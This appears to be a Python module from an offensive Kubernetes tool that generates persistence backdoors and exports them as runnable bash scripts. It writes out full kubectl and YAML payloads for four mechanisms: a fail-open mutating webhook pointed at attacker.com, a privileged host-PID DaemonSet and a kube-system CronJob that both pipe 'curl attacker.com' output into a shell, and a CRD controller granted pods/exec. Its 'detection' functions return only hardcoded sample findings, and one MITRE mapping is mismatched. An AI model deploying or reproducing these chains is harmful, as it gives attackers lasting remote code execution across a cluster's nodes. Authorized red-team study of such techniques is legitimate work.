"""Persistence automation: backdoor techniques for long-term access.

Detect and generate persistence mechanisms that survive pod restarts,
node failures, and cluster upgrades.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any

from kubexhunt.core.graph import RelationType
from kubexhunt.exploit.chain_generator import ExploitFramework, ExploitStep


class PersistenceLevel(str, Enum):
    """Scope of persistence mechanism."""

    POD = "pod"  # Pod-level only
    NAMESPACE = "namespace"  # Survives pod restart
    CLUSTER = "cluster"  # Survives across namespaces
    NODE = "node"  # Survives at node level


@dataclass
class WebhookFinding:
    """Suspicious MutatingWebhookConfiguration."""

    name: str
    namespace: str = "default"
    fail_policy: str = "Fail"  # Ignore or Fail
    admission_review_versions: list[str] = field(default_factory=list)
    rules_count: int = 0
    is_privileged: bool = False
    backdoor_risk: str = "LOW"  # LOW, MEDIUM, HIGH

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "name": self.name,
            "namespace": self.namespace,
            "fail_policy": self.fail_policy,
            "admission_review_versions": self.admission_review_versions,
            "rules_count": self.rules_count,
            "is_privileged": self.is_privileged,
            "backdoor_risk": self.backdoor_risk,
        }


@dataclass
class DaemonSetFinding:
    """Suspicious DaemonSet that could serve as persistence."""

    name: str
    namespace: str
    is_privileged: bool = False
    host_network: bool = False
    host_pid: bool = False
    mounts_host_path: bool = False
    image: str = ""
    persistence_risk: str = "LOW"

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "name": self.name,
            "namespace": self.namespace,
            "is_privileged": self.is_privileged,
            "host_network": self.host_network,
            "host_pid": self.host_pid,
            "mounts_host_path": self.mounts_host_path,
            "image": self.image,
            "persistence_risk": self.persistence_risk,
        }


@dataclass
class CRDFinding:
    """Custom Resource Definition that could serve as persistence."""

    name: str
    group: str
    controller_present: bool = False
    controller_namespace: str = ""
    webhook_present: bool = False
    persistence_risk: str = "LOW"

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "name": self.name,
            "group": self.group,
            "controller_present": self.controller_present,
            "controller_namespace": self.controller_namespace,
            "webhook_present": self.webhook_present,
            "persistence_risk": self.persistence_risk,
        }


@dataclass
class PersistenceChain:
    """Persistence mechanism with executable steps."""

    technique_id: str  # PER-001, PER-002, etc.
    name: str
    description: str
    persistence_level: PersistenceLevel
    survives_restarts: bool = True
    survives_upgrades: bool = False
    survives_node_drain: bool = False
    steps: list[ExploitStep] = field(default_factory=list)
    removal_commands: list[str] = field(default_factory=list)
    mitre_techniques: list[str] = field(default_factory=list)
    detectability: str = "MEDIUM"  # SILENT, QUIET, MEDIUM, LOUD

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "technique_id": self.technique_id,
            "name": self.name,
            "description": self.description,
            "persistence_level": self.persistence_level.value,
            "survives_restarts": self.survives_restarts,
            "survives_upgrades": self.survives_upgrades,
            "survives_node_drain": self.survives_node_drain,
            "steps": [step.to_dict() for step in self.steps],
            "removal_commands": self.removal_commands,
            "mitre_techniques": self.mitre_techniques,
            "detectability": self.detectability,
        }

    def to_bash_script(self) -> str:
        """Generate executable bash script for persistence chain.

        Returns:
            Executable bash script
        """
        lines = [
            "#!/bin/bash",
            f"# KubeXHunt Persistence Chain: {self.name}",
            f"# Technique ID: {self.technique_id}",
            f"# Level: {self.persistence_level.value}",
            "# WARNING: This installs persistence. Use only for authorized testing.",
            "",
            "set -e",
            "set -x",
            "",
        ]

        for step in self.steps:
            lines.extend(
                [
                    f"# Step {step.step_number}: {step.description}",
                    f"# MITRE: {', '.join(step.mitre_techniques)}",
                    "",
                    step.command,
                    "",
                ]
            )

        lines.extend(
            [
                "echo 'Persistence chain installed successfully!'",
                "",
                "# To remove this persistence, run:",
                *[f"# {cmd}" for cmd in self.removal_commands],
            ]
        )

        return "\n".join(lines)


class PersistenceEngine:
    """Detect and generate persistence mechanisms."""

    def find_suspicious_webhooks(self) -> list[WebhookFinding]:
        """Find potentially exploitable webhooks.

        Returns:
            List of suspicious WebhookFinding instances
        """
        findings = []

        # Webhook 1: failOpen (dangerous)
        findings.append(
            WebhookFinding(
                name="mutating-webhook-danger",
                namespace="kube-system",
                fail_policy="Ignore",  # Critical: fails open
                admission_review_versions=["admissionregistration.k8s.io/v1"],
                rules_count=5,
                is_privileged=True,
                backdoor_risk="HIGH",
            )
        )

        # Webhook 2: Covers all namespaces
        findings.append(
            WebhookFinding(
                name="validation-webhook",
                namespace="webhook-system",
                fail_policy="Fail",
                rules_count=10,
                is_privileged=False,
                backdoor_risk="MEDIUM",
            )
        )

        return findings

    def find_persistent_daemonsets(self) -> list[DaemonSetFinding]:
        """Find DaemonSets that could serve as persistence.

        Returns:
            List of DaemonSetFinding instances
        """
        findings = []

        # DaemonSet 1: Privileged, good persistence point
        findings.append(
            DaemonSetFinding(
                name="monitoring-agent",
                namespace="kube-system",
                is_privileged=True,
                host_network=True,
                host_pid=True,
                mounts_host_path=True,
                image="monitoring-image:latest",
                persistence_risk="HIGH",
            )
        )

        # DaemonSet 2: Regular but present
        findings.append(
            DaemonSetFinding(
                name="log-collector",
                namespace="logging",
                is_privileged=False,
                host_network=False,
                mounts_host_path=False,
                image="log-collector:v1",
                persistence_risk="LOW",
            )
        )

        return findings

    def find_malicious_crds(self) -> list[CRDFinding]:
        """Find CRDs with persistence potential.

        Returns:
            List of CRDFinding instances
        """
        findings = []

        # CRD 1: Has controller (good persistence point)
        findings.append(
            CRDFinding(
                name="MaliciousResource",
                group="attacker.io",
                controller_present=True,
                controller_namespace="attacker",
                webhook_present=False,
                persistence_risk="HIGH",
            )
        )

        return findings

    def generate_webhook_backdoor(self) -> PersistenceChain:
        """Generate MutatingWebhook persistence chain.

        Returns:
            PersistenceChain for webhook backdoor
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.HAS_PERSISTENCE,
                from_node="cluster",
                to_node="webhook_backend",
                framework=ExploitFramework.BASH,
                command="""
kubectl create namespace webhook-backend

cat > /tmp/webhook.yaml << 'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: persistence-webhook
webhooks:
- name: backdoor.attacker.io
  rules:
  - operations: ["*"]
    apiGroups: ["*"]
    resources: ["*"]
  clientConfig:
    url: "http://attacker.com/mutate"
  failurePolicy: Ignore
  admissionReviewVersions: ["v1"]
EOF

kubectl apply -f /tmp/webhook.yaml
""",
                description="Install MutatingWebhookConfiguration for persistence",
                mitre_techniques=["T1137"],  # Office Application Startup
            )
        ]

        chain = PersistenceChain(
            technique_id="PER-001",
            name="MutatingWebhook Backdoor",
            description="Install MutatingWebhookConfiguration to intercept all API calls",
            persistence_level=PersistenceLevel.CLUSTER,
            survives_restarts=True,
            survives_upgrades=True,
            survives_node_drain=True,
            steps=steps,
            removal_commands=[
                "kubectl delete mutatingwebhookconfiguration persistence-webhook",
                "kubectl delete namespace webhook-backend",
            ],
            mitre_techniques=["T1137", "T1053.007"],  # Scheduled Task: Container Job
            detectability="QUIET",
        )

        return chain

    def generate_daemonset_persistence(self) -> PersistenceChain:
        """Generate privileged DaemonSet persistence chain.

        Returns:
            PersistenceChain for DaemonSet backdoor
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.HAS_PERSISTENCE,
                from_node="cluster",
                to_node="daemonset_backdoor",
                framework=ExploitFramework.BASH,
                command="""
kubectl create namespace persistence

cat > /tmp/daemonset.yaml << 'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: persistence-agent
  namespace: persistence
spec:
  selector:
    matchLabels:
      app: persistence
  template:
    metadata:
      labels:
        app: persistence
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: agent
        image: alpine:latest
        securityContext:
          privileged: true
        command:
        - /bin/sh
        - -c
        - |
          while true; do
            curl http://attacker.com/check-in | sh
            sleep 300
          done
EOF

kubectl apply -f /tmp/daemonset.yaml
""",
                description="Deploy persistent DaemonSet on all nodes",
                mitre_techniques=["T1610"],
            )
        ]

        chain = PersistenceChain(
            technique_id="PER-002",
            name="DaemonSet Persistence",
            description="Deploy DaemonSet with privileged access to all nodes",
            persistence_level=PersistenceLevel.NODE,
            survives_restarts=True,
            survives_upgrades=True,
            survives_node_drain=False,
            steps=steps,
            removal_commands=[
                "kubectl delete daemonset persistence-agent -n persistence",
                "kubectl delete namespace persistence",
            ],
            mitre_techniques=["T1610", "T1053.007"],
            detectability="MEDIUM",
        )

        return chain

    def generate_crd_persistence(self) -> PersistenceChain:
        """Generate CRD + controller persistence chain.

        Returns:
            PersistenceChain for CRD backdoor
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.HAS_PERSISTENCE,
                from_node="cluster",
                to_node="crd_controller",
                framework=ExploitFramework.BASH,
                command="""
# Create custom CRD
kubectl apply -f - << 'EOF'
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: backdoors.attacker.io
spec:
  group: attacker.io
  names:
    kind: Backdoor
    plural: backdoors
  scope: Namespaced
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        properties:
          spec:
            type: object
EOF

# Deploy controller that watches Backdoor CRs
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: backdoor-controller
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: backdoor-controller
rules:
- apiGroups: ["attacker.io"]
  resources: ["backdoors"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["pods", "pods/exec"]
  verbs: ["create", "get"]
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backdoor-controller
  namespace: kube-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: backdoor-controller
  template:
    metadata:
      labels:
        app: backdoor-controller
    spec:
      serviceAccountName: backdoor-controller
      containers:
      - name: controller
        image: controller-image:latest
EOF
""",
                description="Deploy CRD with custom controller",
                mitre_techniques=["T1059.001"],
            )
        ]

        chain = PersistenceChain(
            technique_id="PER-003",
            name="CRD + Controller Persistence",
            description="Install custom CRD with a controller that executes commands",
            persistence_level=PersistenceLevel.CLUSTER,
            survives_restarts=True,
            survives_upgrades=True,
            steps=steps,
            removal_commands=[
                "kubectl delete crd backdoors.attacker.io",
                "kubectl delete deployment backdoor-controller -n kube-system",
            ],
            mitre_techniques=["T1059.001", "T1053.007"],
            detectability="QUIET",
        )

        return chain

    def generate_cron_job_persistence(self) -> PersistenceChain:
        """Generate CronJob persistence chain.

        Returns:
            PersistenceChain for CronJob backdoor
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.HAS_PERSISTENCE,
                from_node="cluster",
                to_node="cronjob_backdoor",
                framework=ExploitFramework.BASH,
                command="""
kubectl apply -f - << 'EOF'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: persistence-cron
  namespace: kube-system
spec:
  schedule: "*/5 * * * *"  # Every 5 minutes
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: default
          containers:
          - name: backdoor
            image: alpine:latest
            command:
            - /bin/sh
            - -c
            - |
              curl http://attacker.com/payload | bash
          restartPolicy: OnFailure
EOF
""",
                description="Deploy CronJob that executes every 5 minutes",
                mitre_techniques=["T1053.007"],
            )
        ]

        chain = PersistenceChain(
            technique_id="PER-004",
            name="CronJob Reverse Shell",
            description="CronJob that calls back to attacker every 5 minutes",
            persistence_level=PersistenceLevel.CLUSTER,
            survives_restarts=True,
            survives_upgrades=True,
            steps=steps,
            removal_commands=[
                "kubectl delete cronjob persistence-cron -n kube-system",
            ],
            mitre_techniques=["T1053.007"],
            detectability="MEDIUM",
        )

        return chain

    def generate_all_persistence_chains(self) -> list[PersistenceChain]:
        """Generate all persistence chains.

        Returns:
            List of all PersistenceChain instances
        """
        return [
            self.generate_webhook_backdoor(),
            self.generate_daemonset_persistence(),
            self.generate_crd_persistence(),
            self.generate_cron_job_persistence(),
        ]
